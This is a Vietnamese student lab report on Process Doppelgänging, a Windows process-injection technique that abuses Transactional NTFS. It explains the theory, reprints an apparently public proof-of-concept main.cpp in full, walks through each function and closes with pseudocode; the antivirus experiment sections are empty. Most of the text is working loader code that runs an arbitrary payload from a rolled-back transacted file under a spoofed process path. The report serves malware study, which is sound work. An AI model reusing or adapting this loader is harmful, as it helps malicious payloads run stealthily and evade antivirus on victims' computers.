# Lab 4

## Thông tin nhóm 
| Họ và Tên | MSSV | 
| -------- | -------- | 
| Nguyễn Văn Quốc Gia    | 24520415    |
| Trịnh Quang Minh    | 24521089    |

### D1. Tìm hiểu lý thuyết về Process Doppelganging
Process Doppelgänging là một trong những phương pháp Process Injection, cho phép tạo process độc hại mà không cần phải chạy file độc hại, lợi dụng cơ chế Windows Transactional NTFS(TxF) trên Windows 

Đầu tiên ta cần hiểu TxF 

TxF là một cơ chế thực hiện thao tác trên file an toàn: để đảm bảo tính toàn vẹn dữ liệu, TxF chỉ cho phép một handle ghi vào file tại một thời điểm, cho đến khi transaction ghi kết thúc thì tất cả handle khác bị cô lập khỏi writer và chỉ thấy được phiên bản đã commit trước đó. 

-> Tức cho phép tạo transaction thực hiện các hành động, transaction này sẽ là một unit nhỏ nhất, tức toàn bộ hành động được thực hiện(commit) hoặc không hành động nào được thực hiện cả (rollback)

Process Doppelgänging lợi dụng TxF để thực hiện process injection theo flow sau:
- TRANSACT: 
    - `CreateTransaction()`          → tạo TxF transaction
    - `CreateFileTransacted()`       → mở file hợp lệ trong transaction
    - `WriteFile()`                  → ghi đè mã độc vào file đó (chỉ nhìn thấy trong transaction)

    => Tạo một TxF transaction dùng file thực thi hợp lệ, sau đó ghi đè file bằng mã độc. Những thay đổi này bị cô lập — chỉ nhìn thấy trong phạm vi transaction, không ảnh hưởng file thật trên đĩa.
- LOAD: 
    - `NtCreateSection()`            → tạo section từ file đã ghi đè trong transaction

    => điểm quan trọng của kỹ thuật này là section được tạo ra lấy từ file trong transaction(file đã ghi đè thành độc hại)
- ROLLBACK: 
    - RollbackTransaction()        → hủy toàn bộ thay đổi trong transaction
    
    => file trên đĩa trở về sạch như ban đầu, nhưng section trong RAM vẫn còn chứa payload.
- ANIMATE: 
    - NtCreateProcessEx(hSection)  → tạo process từ section độc hại trong RAM ta đã tạo ở trên 
    - NtCreateThreadEx()           → tạo thread chạy process tạo ở trên 

### D2. Thực nghiệm không có Anti Virus 
### D3. Thực nghiệm có Windows Defender 
### D4. Phân tích mã và viết lại dưới dạng mã giả
Ta phân kĩ `main.cpp` của repo 
```cpp 
#include <Windows.h>
#include <KtmW32.h>

#include <iostream>
#include <stdio.h>

#include "ntddk.h"
#include "ntdll_undoc.h"
#include "util.h"

#include "pe_hdrs_helper.h"
#include "process_env.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Ntdll.lib")

#define PAGE_SIZE 0x1000

HANDLE make_transacted_section(BYTE* payloadBuf, DWORD payloadSize)
{
    DWORD options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transaction!" << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, temp_path);

    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
    HANDLE hTransactedWriter = CreateFileTransactedW(dummy_name,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedWriter == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    DWORD writtenLen = 0;
    if (!WriteFile(hTransactedWriter, payloadBuf, payloadSize, &writtenLen, NULL)) {
        std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedWriter);
    hTransactedWriter = nullptr;

    HANDLE hTransactedReader = CreateFileTransactedW(dummy_name,
        GENERIC_READ,
        FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedReader == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open transacted file: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_MAP_EXECUTE,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedReader
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedReader);
    hTransactedReader = nullptr;

    if (RollbackTransaction(hTransaction) == FALSE) {
        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransaction);
    hTransaction = nullptr;

    return hSection;
}


bool process_doppel(wchar_t* targetPath, BYTE* payloadBuf, DWORD payloadSize)
{
    HANDLE hSection = make_transacted_section(payloadBuf, payloadSize);
    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        return false;
    }
    HANDLE hProcess = nullptr;
    NTSTATUS status = NtCreateProcessEx(
        &hProcess, //ProcessHandle
        PROCESS_ALL_ACCESS, //DesiredAccess
        NULL, //ObjectAttributes
        NtCurrentProcess(), //ParentProcess
        PS_INHERIT_HANDLES, //Flags
        hSection, //sectionHandle
        NULL, //DebugPort
        NULL, //ExceptionPort
        FALSE //InJob
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateProcessEx failed! Status: " << std::hex << status << std::endl;
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            std::cerr << "[!] The payload has mismatching bitness!" << std::endl;
        }
        return false;
    }

    PROCESS_BASIC_INFORMATION pi = { 0 };

    DWORD ReturnLength = 0;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtQueryInformationProcess failed: " << std::hex << status << std::endl;
        return false;
    }
    PEB peb_copy = { 0 };
    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
        return false;
    }
    ULONGLONG imageBase = (ULONGLONG) peb_copy.ImageBaseAddress;
#ifdef _DEBUG
    std::cout << "ImageBase address: " << (std::hex) << (ULONGLONG)imageBase << std::endl;
#endif
    DWORD payload_ep = get_entry_point_rva(payloadBuf);
    ULONGLONG procEntry =  payload_ep + imageBase;

    if (!setup_process_parameters(hProcess, pi, targetPath)) {
        std::cerr << "Parameters setup failed" << std::endl;
        return false;
    }
    std::cout << "[+] Process created! Pid = " << std::dec << GetProcessId(hProcess) << "\n";
#ifdef _DEBUG
    std::cerr << "EntryPoint at: " << (std::hex) << (ULONGLONG)procEntry << std::endl;
#endif
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE) procEntry,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateThreadEx failed: " << std::hex << status << std::endl;
        return false;
    }

    return true;
}

int wmain(int argc, wchar_t *argv[])
{
#ifdef _WIN64
    const bool is32bit = false;
#else
    const bool is32bit = true;
#endif
    if (argc < 2) {
        std::cout << "Process Doppelganging (";
        if (is32bit) std::cout << "32bit";
        else std::cout << "64bit";
        std::cout << ")\n";
        std::cout << "params: <payload path> [*target path]\n" << std::endl;
        std::cout << "* - optional" << std::endl;
        system("pause");
        return 0;
    }
    if (init_ntdll_func() == false) {
        return -1;
    }
    wchar_t defaultTarget[MAX_PATH] = { 0 };
    get_calc_path(defaultTarget, MAX_PATH, is32bit);
    wchar_t *targetPath = defaultTarget;
    if (argc >= 3) {
        targetPath = argv[2];
    }
    wchar_t *payloadPath = argv[1];
    size_t payloadSize = 0;

    BYTE* payloadBuf = buffer_payload(payloadPath, payloadSize);
    if (payloadBuf == NULL) {
        std::cerr << "Cannot read payload!" << std::endl;
        return -1;
    }

    bool is_ok = process_doppel(targetPath, payloadBuf, (DWORD) payloadSize);

    free_buffer(payloadBuf, payloadSize);
    if (is_ok) {
        std::cerr << "[+] Done!" << std::endl;
    } else {
        std::cerr << "[-] Failed!" << std::endl;
#ifdef _DEBUG
        system("pause");
#endif
        return -1;
    }
#ifdef _DEBUG
    system("pause");
#endif
    return 0;
}
``` 

Ta thấy được flow của code như sau:
- `wmain()` gọi `process_doppel()`, `process_doppel()` là hàm xử lý chính thực hiện kỹ thuật `Process Doppelganging`
- `process_doppel()` gọi `make_transacted_section()` để tạo section độc hại, sau đó dùng section để tạo process độc hại tương ứng và chạy process đó 

Ta phân tích kĩ hơn `make_transacted_section()` và `process_doppel()`

#### a. `make_transacted_section(BYTE* payloadBuf, DWORD payloadSize)`
Hàm này nhận input là payload và size của payload, output trả về là section độc hại chứa payload đó 

Đầu tiên hàm tạo transaction theo cơ chế TxF sử dụng API `CreateTransaction`
```cpp
HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
if (hTransaction == INVALID_HANDLE_VALUE) {
    std::cerr << "Failed to create transaction!" << std::endl;
    return INVALID_HANDLE_VALUE;
}
```

Tiếp theo, chương trình tạo một file tạm trong `temp_path`(`"C:\Users\PC\AppData\Local\Temp\"`) và lưu toàn bộ đường dẫn của file mới tạo vào `dummy_name` 
```cpp
wchar_t dummy_name[MAX_PATH] = { 0 };
wchar_t temp_path[MAX_PATH] = { 0 };
DWORD size = GetTempPathW(MAX_PATH, temp_path);

GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
```
- `DWORD size = GetTempPathW(MAX_PATH, temp_path);`: lưu đường dẫn thư mục tmp của windows vào `temp_path`, `temp_path` = `L"C:\Users\PC\AppData\Local\Temp\"`
- `GetTempFileNameW(temp_path, L"TH", 0, dummy_name);`: với `uUnique`(tham số thứ 3) là 0 thì hàm sẽ tạo một file có tên random với prefix là `TH` trong `temp_path`, lưu toàn bộ đường dẫn của file mới tạo vào `dummy_name`

Tiếp theo, chương trình mở file `dummy_name` trong transaction đã tạo (biến `hTransaction`) bằng API `CreateFileTransactedW`(truyền tham số `dummy_name` và `hTransaction`)
```cpp
HANDLE hTransactedWriter = CreateFileTransactedW(dummy_name,
    GENERIC_WRITE,
    FILE_SHARE_READ,
    NULL,
    CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,
    NULL,
    hTransaction,
    NULL,
    NULL
);
```

Sau đó chương trình ghi(trong transaction) nội dung payload vào trong `hTransactedWriter`(tức file `dummy_name`)
```cpp
if (!WriteFile(hTransactedWriter, payloadBuf, payloadSize, &writtenLen, NULL)) {
    std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
    return INVALID_HANDLE_VALUE;
}

CloseHandle(hTransactedWriter);
hTransactedWriter = nullptr;
```

Sau đó chương trình sử dụg API `hTransactedReader` để mở file `dummy_name` trong transaction đã tạo, từ đó đọc section của `dummy_name`(lúc này trong transaction đã được ghi đè thành file độc hại) vào trong biến `hSection`(sử dụng API `NtCreateSection`)(khi đó thì `hSection` là section chứa payload độc hại)
```cpp
HANDLE hTransactedReader = CreateFileTransactedW(dummy_name,
    GENERIC_READ,
    FILE_SHARE_WRITE,
    NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL,
    hTransaction,
    NULL,
    NULL
);

NTSTATUS status = NtCreateSection(&hSection,
    SECTION_MAP_EXECUTE,
    NULL,
    0,
    PAGE_READONLY,
    SEC_IMAGE,
    hTransactedReader
);
```

Cuối cùng thì chương trình thực hiện Roll back Transaction(khi đó thì file `dummy_name` đang bị ghi đè thành độc hại trong transaction sẽ không thay đổi ở ngoài disk) và trả về `hSection`(tức section chứa payload độc hại)
```cpp 
if (RollbackTransaction(hTransaction) == FALSE) {
    std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
    return INVALID_HANDLE_VALUE;
}
CloseHandle(hTransaction);
hTransaction = nullptr;

return hSection;
```
#### b. `process_doppel(wchar_t* targetPath, BYTE* payloadBuf, DWORD payloadSize)`
Hàm này nhận input là `targetPath`(tên executable sử dụng cho process độc hại), payload và size của payload, hàm này thực hiện tạo process độc hại chứa payload, tạo thread để chạy process độc hại đó 

Đầu tiên, chương trình gọi `make_transacted_section()` với 2 tham số là payload và size của payload, từ đó tạo section độc hại chứa payload lưu dưới biến `hSection`

Sau đó sử dụng API `NtCreateProcessEx` truyền tham số `hSection` để tạo process độc hại chứa section độc hại vừa tạo, lưu process đó vào biến `hProcess` 
```cpp
HANDLE hSection = make_transacted_section(payloadBuf, payloadSize);
if (!hSection || hSection == INVALID_HANDLE_VALUE) {
    return false;
}
HANDLE hProcess = nullptr;
NTSTATUS status = NtCreateProcessEx(
    &hProcess, //ProcessHandle
    PROCESS_ALL_ACCESS, //DesiredAccess
    NULL, //ObjectAttributes
    NtCurrentProcess(), //ParentProcess
    PS_INHERIT_HANDLES, //Flags
    hSection, //sectionHandle
    NULL, //DebugPort
    NULL, //ExceptionPort
    FALSE //InJob
);
```

Tiếp theo, chươnng trình tính VA của entrypoint trong payload như sau: 
```cpp
PEB peb_copy = { 0 };
if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
    return false;
}
ULONGLONG imageBase = (ULONGLONG) peb_copy.ImageBaseAddress;

DWORD payload_ep = get_entry_point_rva(payloadBuf);
ULONGLONG procEntry =  payload_ep + imageBase;
```
- copy PEB của `hProcess`(process chứa payload) sang biến `peb_copy`
- `procEntry` = `get_entry_point_rva(payloadBuf)` + `peb_copy.ImageBaseAddress`, biến này lưu VA của entrypoint trong payload

Sau đó, chương trình sử dụng `targetPath` làm tên executable file metadata trong process độc hại `hProcess` này 
```cpp
if (!setup_process_parameters(hProcess, pi, targetPath)) {
    std::cerr << "Parameters setup failed" << std::endl;
    return false;
}
```

Cuối cùng, chương trình tạo và run thread với tham số là `hProcess`(process độc hại đã tạo) và entry point là `procEntry`
```cpp
status = NtCreateThreadEx(&hThread,
    THREAD_ALL_ACCESS,
    NULL,
    hProcess,
    (LPTHREAD_START_ROUTINE) procEntry,
    NULL,
    FALSE,
    0,
    0,
    0,
    NULL
);
```

Như vậy ta đã hiểu được flow của kỹ thuật Process Doppelganging mà chương trình thực hiện như sau: 
- Tạo transaction 
- Ghi đè một file bất kì thành payload trong transaction đó 
- Tạo section sử dụng input là file đã ghi đè thành payload, từ đó section tạo ra chứa payload 
- Rollback lại transaction, từ đó file bị ghi đè đó không được sửa đổi ở ngoài disk 
- Tạo process tương ứng sử dụng section độc hại đã tạo 
- Sửa giá trị executable file metadate của process đó thành một file bình thường 
- Tạo thread chạy process đã tạo 

Theo flow đó, ta có được mã giả thực hiện Process Doppelganging như sau: 
```cpp

// Đọc payload từ disk vào RAM
payloadBuf  = ReadFile(payloadPath)
payloadSize = GetFileSize(payloadPath)


// BƯỚC 1 — TRANSACT: Tạo transaction và ghi payload vào file tạm trong transaction

hTransaction = CreateTransaction()

// Tạo file tạm 
temp_path  = GetTempPathW()
dummy_name = GetTempFileNameW(temp_path, prefix="TH")

// Mở file tạm trong transaction, ghi payload vào
hTransactedWriter = CreateFileTransactedW(dummy_name, WRITE, hTransaction)
WriteFile(hTransactedWriter, payloadBuf, payloadSize)
CloseHandle(hTransactedWriter)


// BƯỚC 2 — LOAD: Tạo section từ file tạm đang chứa payload trong transaction

hTransactedReader = CreateFileTransactedW(dummy_name, READ, hTransaction)

hSection = NtCreateSection(
    type  = SEC_IMAGE,        
    hFile = hTransactedReader // file độc hại trong transaction
)
CloseHandle(hTransactedReader)


// BƯỚC 3 — ROLLBACK: Hủy transaction → disk sạch, section trong RAM vẫn còn

RollbackTransaction(hTransaction)


// BƯỚC 4 — ANIMATE: Tạo process từ section, thiết lập và chạy


// Tạo process từ section độc hại 
hProcess = NtCreateProcessEx(
    parentProcess = NtCurrentProcess(),
    hSection      = hSection
)

// Tính entry point tuyệt đối của payload
pi          = NtQueryInformationProcess(hProcess, ProcessBasicInformation)
peb_copy    = ReadProcessMemory(hProcess, pi.PebBaseAddress)
imageBase   = peb_copy.ImageBaseAddress        // Windows Loader đã map ở đây
payload_ep  = get_entry_point_rva(payloadBuf)  // RVA từ PE header của payload
procEntry   = imageBase + payload_ep           // VA tuyệt đối để thực thi

// Ngụy trang process (đổi executable file metadate thành targetPath)
params = RtlCreateProcessParametersEx(targetPath)
VirtualAllocEx(hProcess, params)
WriteProcessMemory(hProcess, peb_copy.ProcessParameters, params)

// Tạo thread -> payload bắt đầu thực thi
hThread = NtCreateThreadEx(
    hProcess  = hProcess,
    startAddr = procEntry   
)

return true
```